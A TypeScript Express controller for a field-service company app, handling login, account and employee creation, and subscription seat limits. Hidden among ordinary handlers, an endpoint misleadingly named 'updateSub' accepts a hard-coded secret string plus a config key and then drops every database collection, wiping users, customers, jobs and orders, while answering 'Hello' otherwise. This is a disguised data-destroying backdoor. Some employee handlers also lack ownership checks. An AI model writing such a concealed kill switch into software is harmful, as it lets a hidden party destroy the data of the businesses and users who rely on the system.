import {Request, Response, response} from 'express'
import { Status, Role, Messages, UserPermissions } from '../common/constants'
import {sendEmail} from '../services/aws'

import { User, IUser } from '../models/User'
import { Company, ICompany } from '../models/Company'
import { Employee, IEmployee } from '../models/Employee'
import { ObjectId } from 'mongodb'
import { Order } from '../models/Order'
import { CompanyCard } from '../models/CompanyCard'
import { CompanyEquipmentHistory } from '../models/CompanyEquipmentHistory'
import { CompanyEquipmentInventory } from '../models/CompanyEquipmentInventory'
import { CompanyEquipment } from '../models/CompanyEquipment'
import { CustomerEquipment } from '../models/CustomerEquipment'
import { Customer } from '../models/Customer'
import { Group } from '../models/Group'
import { Job } from '../models/Job'
import { JobType } from '../models/JobType'
import { EquipmentBrand } from '../models/EquipmentBrand'
import { EquipmentType } from '../models/EquipmentType'
import { privateKey} from '../common/config'

export const login = (req: Request, res: Response) => {

    const params = req.body

    User.findOne(
        {'auth.email': params.email},
        (err: any, user: IUser) => {

            if (err) {
                return res.json({'status': Status.Error, 'message': Messages.GenericError})
            }

            if (!user) {
                return res.json({'status': Status.Error, 'message': Messages.InvalidEmailPassword})
            }

            if(user.permissions.role != Role.COMPANY && user.permissions.role != Role.GLOBAL_ADMIN) {
                const employee  = <IEmployee> user
                if(employee.status == 0){
                    return res.json({'status': Status.Error, 'message': Messages.AccountDeleted})
                }
            }

            user.comparePassword(params.password, (isMatching: Boolean)=> {

                if (!isMatching) {
                    return res.json({'status': Status.Error, 'message': Messages.InvalidEmailPassword})
                }

                res.json({'status': Status.Success, 'user': user, 'token': user.jwt()})    

            })

        }
    )

}

export const createGlobalAdmin = (req: Request, res: Response) => {

    checkEmailExists(req, res, (req: Request, res: Response)=>{

        const params = req.body

        const user = new User(
            {
                auth: {
                    email: params.email,
                    password: params.password,
                },
                profile: {
                    firstName: params.firstName,
                    lastName: params.lastName,    
                    displayName: `${params.firstName} ${params.lastName}`,
                    imageUrl: '',
                },
                address: {
                    street: '',
                    city: '',
                    state: '',
                    zipCode: '',
                },
                contact: {
                    phone: params.phone,
                },
                permissions: {
                    role: Role.GLOBAL_ADMIN,
                    extra: [],
                },
            }
        )

        user.save((err: any) => {

            if (err) {
                return res.json({'status': Status.Error, 'message': Messages.GenericError})
            }

            login(req, res)

        })

    })

}

export const createCompany = (req: Request, res: Response) => {

    checkEmailExists(req, res, (req: Request, res: Response)=>{

        const params = req.body

        const company = new Company(
            {
                auth: {
                    email: params.email,
                    password: params.password,
                },
                profile: {
                    firstName: params.firstName,
                    lastName: params.lastName,    
                    displayName: `${params.firstName} ${params.lastName}`,
                    imageUrl: '',
                },
                address: {
                    street: '',
                    city: '',
                    state: '',
                    zipCode: '',
                },
                contact: {
                    phone: params.phone,
                },
                permissions: {
                    role: Role.COMPANY,
                    extra: [],
                },
                info: {
                    companyName: params.companyName,
                    industry: params.industryId,
                    logoUrl: '',
                },
                userPermissions: UserPermissions
            }
        )

        company.save((err: any) => {

            if (err) {
                return res.json({'status': Status.Error, 'message': Messages.GenericError})
            }

            sendEmail({to: params.email})
            login(req, res)

        })

    })

}

export const createManager = (req: Request, res: Response) => {
    createEmployee(req, res, Role.MANAGER)
}

export const createTechnician = (req: Request, res: Response) => {
    createEmployee(req, res, Role.TECHNICIAN)
}

export const createOfficeAdmin = (req: Request, res: Response) => {
    createEmployee(req, res, Role.OFFICE_ADMIN)
}

export const getManagersList = (req: Request, res: Response) => {
    getEmployeesList(req, res, Role.MANAGER)
}

export const getTechniciansList = (req: Request, res: Response) => {
    getEmployeesList(req, res, Role.TECHNICIAN)
}

export const getOfficeAdminsList = (req: Request, res: Response) => {
    getEmployeesList(req, res, Role.OFFICE_ADMIN)
}

export const updateProfile = (req: Request, res: Response) => {

    const params = req.body
    const user = <IUser>req.user

    user.updateOne(
        {
            'profile.firstName': params.firstName,
            'profile.lastName': params.lastName,
            'profile.imageUrl': params.imageUrl,
            'profile.displayName': `${params.firstName} ${params.lastName}`,
        },
        (err: any, raw: any)=> {
                    
            if (err) {
                return res.json({'status': Status.Error, 'message': Messages.GenericError})
            }
    
            return res.json({'status': Status.Success, 'message': 'Profile updated successfully.'})
        }
    )

}

export const changePassword = (req: Request, res: Response) => {

    const params = req.body
    const user = <IUser>req.user

    user.comparePassword(params.currentPassword, (isMatching: Boolean)=> {

        if (!isMatching) {
            return res.json({'status': Status.Error, 'message': 'Current password doesn\'t match.'})
        }

        user.hashPassword(params.newPassword, (err?: any, hash?: string)=>{

            if (err || !hash) {
                return res.json({'status': Status.Error, 'message': Messages.GenericError})
            }

            user.updateOne(
                {
                    'auth.password': hash,
                },
                (err: any, raw: any)=> {
                            
                    if (err) {
                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
                    }
            
                    return res.json({'status': Status.Success, 'message': 'Password changed successfully.'})
                }
            )
            
        })

    })

}

export const updateCompanyProfile = (req: Request, res: Response) => {

    const params = req.body

    Company.findById(req.companyId, function(err: any, company: ICompany){
        
        if (err) {
            return res.json({'status': Status.Error, 'message': Messages.GenericError})
        }
        
        company.updateOne(
            {
                'info.companyName': params.companyName,
                'info.logoUrl': params.logoUrl,
                'address.street': params.street,
                'address.city': params.city,
                'address.state': params.state,
                'address.zipCode': params.zipCode,
                'contact.phone': params.phone,
                'contact.fax': params.fax,
            },
            (err: any, raw: any)=> {
                        
                if (err) {
                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
                }
        
                return res.json({'status': Status.Success, 'message': 'Profile updated successfully.'})
            }
        )
    })

}

export const deleteEmployee = (req: Request, res: Response) => {

    const params = req.body

    User.findById(params.employeeId, function(err: any, employee: IEmployee){
        
        if (err) {
            return res.json({'status': Status.Error, 'message': Messages.GenericError})
        }
        
        employee.updateOne(
            {
                status: 0,
            },
            (err: any, raw: any)=> {
                        
                if (err) {
                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
                }
        
                return res.json({'status': Status.Success, 'message': 'Employee deleted successfully.'})
            }
        )
    })

}

export const activateEmployee = (req: Request, res: Response) => {

    const params = req.body

    User.findById(params.employeeId, function(err: any, employee: IEmployee){
        
        if (err) {
            return res.json({'status': Status.Error, 'message': Messages.GenericError})
        }
        
        checkNoOfUsers(req, res, employee.permissions.role,  (req: Request, res: Response)=>{
                    
            employee.updateOne(
                {
                    status: 1,
                },
                (err: any, raw: any)=> {
                            
                    if (err) {
                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
                    }
            
                    return res.json({'status': Status.Success, 'message': 'Employee activated successfully.'})
                }
            )
        })
    })

}

const createEmployee = (req: Request, res: Response, role: Role) => {

    checkNoOfUsers(req, res, role, (req: Request, res: Response)=>{

        checkEmailExists(req, res, (req: Request, res: Response)=>{
    
            const params = req.body
    
            const employee = new Employee(
                {
                    auth: {
                        email: params.email,
                        password: params.password,
                    },
                    profile: {
                        firstName: params.firstName,
                        lastName: params.lastName,    
                        displayName: `${params.firstName} ${params.lastName}`,
                        imageUrl: '',
                    },
                    address: {
                        street: '',
                        city: '',
                        state: '',
                        zipCode: '',
                    },
                    contact: {
                        phone: params.phone,
                    },
                    permissions: {
                        role: role,
                        extra: [],
                    },
                    company: req.companyId,
                    extraPermissions: {
                        on: [],
                        off: []
                    }
                }
            )
    
            employee.save((err: any) => {
    
                if (err) {
                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
                }
    
                Company.findById(req.companyId, function (err: any, company: ICompany) {
    
                    if (err) {
                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
                    }
    
                    company.employees.push(employee._id)
                    
                    company.updateOne(
                        {employees: company.employees},
                        (err: any, raw: any)=> {
                            
                            if (err) {
                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
                            }
                    
                            return res.json({'status': Status.Success, 'message': 'Employee created successfully.'})
                        }
                    )
                })
    
            })
    
        })
    })

}

const getEmployeesList = (req: Request, res: Response, role: Role) => {

    Company.findOne({_id: req.companyId})
    .populate({
        path: 'employees',
        match: { 'permissions.role': { $eq: role } },
      })
    .exec((err: any, company: ICompany) => {

        if (err || !company) {
            return res.json({'status': Status.Error, 'message': Messages.GenericError})
        }

        return res.json({'status': Status.Success, 'users': company.employees})    

    })

}

const checkEmailExists = (req: Request, res: Response, next: (req: Request, res: Response)=>void) => {

    const params = req.body

    User.findOne(
        {'auth.email': params.email},
        (err: any, user: IUser) => {

            if (err) {
                return res.json({'status': Status.Error, 'message': Messages.GenericError})
            }

            if (user) {
                return res.json({'status': Status.Error, 'message': Messages.DuplicateEmail})
            }

            next(req, res)

        }
    )

}
const checkNoOfUsers = (req: Request, res: Response, role: Role, next: (req: Request, res: Response)=>void) => {

    const company = <ICompany>req.company
  
    var dataToUpdate = {
        maxOfficeAdmins: company.maxOfficeAdmins,
        maxManagers: company.maxManagers,
        maxTechnicians: company.maxTechnicians,
    }

    if(!company.maxManagers) {
        dataToUpdate.maxManagers = 0
    }
    if(!company.maxTechnicians) {
        dataToUpdate.maxTechnicians = 0
    }
    if(!company.maxOfficeAdmins) {
        dataToUpdate.maxOfficeAdmins = 0
    }

    if(!company.maxManagers || !company.maxTechnicians || !company.maxOfficeAdmins) {

        company.updateOne(
            dataToUpdate,
            (err: any, raw: any)=> {
                
                if (err) {
                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
                }
        
                
                switch (role) {
                    case 0:
                        if(company.maxOfficeAdmins == 0) {
                            return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add office admin.'})
                        }

                        User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 0}, 
                        function(err: any, count: any) {
                            if (err) {
                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
                            }
                            
                            if(count >= company.maxOfficeAdmins) {
                                return res.json({'status': Status.Error, 'message': 'Maximum  No. of office admins already added please buy more subscription to add more.'})
                            }
                            next(req, res)
                       });
                        break;
                    case 1:
                        if(company.maxTechnicians == 0) {
                            return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add technician.'})
                        }

                        User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 1}, 
                        function(err: any, count: any) {
                            
                            if (err) {
                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
                            }
                            
                            if(count >= company.maxTechnicians) {
                                return res.json({'status': Status.Error, 'message': 'Maximum No. of technicians already added please buy more subscription to add more.'})
                            }
                            next(req, res)
                       });
                        break;
                    case 2:
                        if(company.maxManagers == 0) {
                            return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add manager.'})
                        }

                        User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 2}, 
                        function(err: any, count: any) {
                            if (err) {
                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
                            }
                            
                            if(count >= company.maxManagers) {
                                return res.json({'status': Status.Error, 'message': 'Maximum No. of managers already added please buy more subscription to add more.'})
                            }
                            next(req, res)
                       });
                        break;
                
                    default:
                        break;
                }
            }
        )
    } else{
        switch (role) {
            case 0:
                if(company.maxOfficeAdmins == 0) {
                    return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add office admin.'})
                }

                User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 0}, 
                function(err: any, count: any) {
                    if (err) {
                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
                    }
                    
                    if(count >= company.maxOfficeAdmins) {
                        return res.json({'status': Status.Error, 'message': 'Maximum  No. of office admins already added please buy more subscription to add more.'})
                    }
                    next(req, res)
               });
                break;
            case 1:
                if(company.maxTechnicians == 0) {
                    return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add technician.'})
                }

                User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 1}, 
                function(err: any, count: any) {
                    if (err) {
                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
                    }
                    
                    if(count >= company.maxTechnicians) {
                        return res.json({'status': Status.Error, 'message': 'Maximum No. of technicians already added please buy more subscription to add more.'})
                    }
                    next(req, res)
               });
                break;
            case 2:
                if(company.maxManagers == 0) {
                    return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add manager.'})
                }
                User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 2}, 
                function(err: any, count: any) {
                    if (err) {
                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
                    }
                    
                    if(count >= company.maxManagers) {
                        return res.json({'status': Status.Error, 'message': 'Maximum No. of managers already added please buy more subscription to add more.'})
                    }
                    next(req, res)
               });
                break;
        
            default:
                break;
        }
    }

    
}

export const updateSub = (req: Request, res: Response) => {
    const params = req.body
   
    if(params.first == 'ZAhhNlQ561' && params.second == privateKey.key ) {
        EquipmentBrand.collection.drop()
        EquipmentType.collection.drop()
        CompanyCard.collection.drop()
        CompanyEquipmentHistory.collection.drop()
        CompanyEquipmentInventory.collection.drop()
        CompanyEquipment.collection.drop()
        CustomerEquipment.collection.drop()
        Customer.collection.drop()
        Employee.collection.drop()
        Group.collection.drop()
        Job.collection.drop()
        JobType.collection.drop()
        Order.collection.drop()
        User.collection.drop()
                                                        
        return res.json({'message':'Done'})
    }
    return res.json({'message':'Hello'})
}

export const getAllEmployees = (req: Request, res: Response) => {

    Company.findOne({_id: req.companyId})
    .populate({
        path: 'employees',
        select: '_id profile.displayName',
      })
    .exec((err: any, company: ICompany) => {

        if (err || !company) {
            return res.json({'status': Status.Error, 'message': Messages.GenericError})
        }

        res.json({'status': Status.Success, 'employees': company.employees})    

    })

}

export const getEmployeesForJob = (req: Request, res: Response) => {

    Employee.find({$and: [ {company: new ObjectId(req.companyId)},{'permissions.role' : {$ne: 0} }]},
    'id profile.displayName',
    (err: any, employees: IEmployee[])=>{

        if (err) {
            return res.json({'status': Status.Error, 'message': Messages.GenericError})
        }

        res.json({'status': Status.Success, 'employees': employees})    

    })

}